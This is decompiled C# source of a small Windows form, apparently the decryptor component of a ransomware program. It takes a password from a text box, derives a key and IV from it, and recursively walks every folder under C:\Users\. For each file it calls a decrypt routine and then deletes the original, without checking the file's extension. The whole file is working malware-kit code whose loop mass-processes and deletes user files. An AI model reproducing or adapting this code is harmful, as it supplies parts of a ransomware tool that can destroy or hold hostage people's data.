using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Tree.My;

namespace Tree;

[DesignerGenerated]
public class enc : Form
{
	private IContainer components;

	private string strFileToEncrypt;

	private string strFileToDecrypt;

	private string strOutputEncrypt;

	private string strOutputDecrypt;

	private FileStream fsInput;

	private FileStream fsOutput;

	public static byte[] bytKy;

	public static byte[] bytV;

	[field: AccessedThroughProperty("TextBox1")]
	internal virtual TextBox TextBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button Button1
	{
		[CompilerGenerated]
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Button1_Click;
			Button button = _Button1;
			if (button != null)
			{
				((Control)button).remove_Click(eventHandler);
			}
			_Button1 = value;
			button = _Button1;
			if (button != null)
			{
				((Control)button).add_Click(eventHandler);
			}
		}
	}

	public enc()
	{
		((Form)this).add_Load((EventHandler)enc_Load);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		TextBox1 = new TextBox();
		Button1 = new Button();
		((Control)this).SuspendLayout();
		((Control)TextBox1).set_Location(new Point(12, 7));
		((Control)TextBox1).set_Name("TextBox1");
		((Control)TextBox1).set_Size(new Size(209, 20));
		((Control)TextBox1).set_TabIndex(0);
		((Control)Button1).set_Location(new Point(227, 5));
		((Control)Button1).set_Name("Button1");
		((Control)Button1).set_Size(new Size(45, 23));
		((Control)Button1).set_TabIndex(1);
		((ButtonBase)Button1).set_Text("Button1");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(true);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(284, 39));
		((Control)this).get_Controls().Add((Control)(object)Button1);
		((Control)this).get_Controls().Add((Control)(object)TextBox1);
		((Control)this).set_Name("enc");
		((Form)this).set_Text("enc");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void enc_Load(object sender, EventArgs e)
	{
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		bytKy = crypt.CreateKey(TextBox1.get_Text());
		bytV = crypt.CreateIV(TextBox1.get_Text());
		getF("C:\\Users\\");
	}

	public static void ScanF(string path)
	{
		string[] directories = Directory.GetDirectories(path);
		foreach (string path2 in directories)
		{
			getF(path2);
		}
	}

	public static void getF(string Path)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string text = default(string);
		string[] files = default(string[]);
		int num5 = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000a;
				case 190:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 3:
							goto IL_001e;
						case 4:
							goto IL_002b;
						case 5:
							goto IL_0038;
						case 6:
							goto IL_005c;
						case 7:
							goto IL_006f;
						case 8:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 9:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_005c:
					num = 6;
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(text);
					goto IL_006f;
					IL_0038:
					num = 5;
					crypt.decrypt(text, text.Replace(".enc", ""), bytKy, bytV);
					goto IL_005c;
					IL_000a:
					num = 2;
					files = Directory.GetFiles(Path);
					num5 = 0;
					goto IL_0077;
					IL_0077:
					if (num5 >= files.Length)
					{
						break;
					}
					text = files[num5];
					goto IL_001e;
					IL_006f:
					num = 7;
					num5 = checked(num5 + 1);
					goto IL_0077;
					IL_001e:
					num = 3;
					crypt.CreateKey(Form1.str);
					goto IL_002b;
					IL_002b:
					num = 4;
					crypt.CreateIV(Form1.str);
					goto IL_0038;
					end_IL_0001_2:
					break;
				}
				num = 8;
				ScanF(Path);
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 190;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}
}
